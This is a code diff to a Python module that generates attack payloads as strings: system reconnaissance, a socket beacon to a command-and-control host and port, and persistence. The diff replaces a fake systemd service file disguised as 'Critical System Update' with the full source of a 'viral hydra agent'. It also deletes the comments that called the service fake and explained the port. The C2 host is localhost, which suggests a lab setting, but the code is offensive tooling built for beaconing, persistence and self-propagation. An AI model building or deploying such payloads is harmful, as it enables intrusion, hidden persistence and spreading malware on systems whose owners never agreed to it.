@@ -1,9 +1,10 @@
 import time
 import os
+import inspect
+from . import hydra
 
 def get_recon_payload():
     timestamp = time.time()
-    # Real python code that runs standard library commands
     return f"""
 import os
 import platform
@@ -37,7 +38,6 @@ except Exception:
 
 def get_beacon_payload():
     timestamp = time.time()
-    # Tries to connect to a port (Switch or arbitrary)
     return f"""
 import socket
 import time
@@ -46,7 +46,7 @@ import time
 # TIMESTAMP: {timestamp}
 
 C2_HOST = '127.0.0.1'
-C2_PORT = 10000 # Trying the vnet switch port or similar
+C2_PORT = 10000
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -59,30 +59,13 @@ except Exception:
 """
 
 def get_persistence_payload():
-    timestamp = time.time()
-    # Writes a fake systemd service file
-    return f"""
-import os
+    return get_hydra_payload()
 
-# TARGET: PERSISTENCE
-# TIMESTAMP: {timestamp}
-
-target = "/tmp/.fake_service_{int(timestamp)}.service"
-content = \"\"\"[Unit]
-Description=Critical System Update
-After=network.target
-
-[Service]
-ExecStart=/usr/bin/python3 -c "while True: import time; time.sleep(100)"
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-\"\"\"
-
-try:
-    with open(target, 'w') as f:
-        f.write(content)
-except Exception:
-    pass
-"""
+def get_hydra_payload():
+    # Returns the source code of the viral hydra agent
+    try:
+        source = inspect.getsource(hydra)
+        # Append the execution block if missing (though it is in the file)
+        return source
+    except Exception:
+        return get_recon_payload()
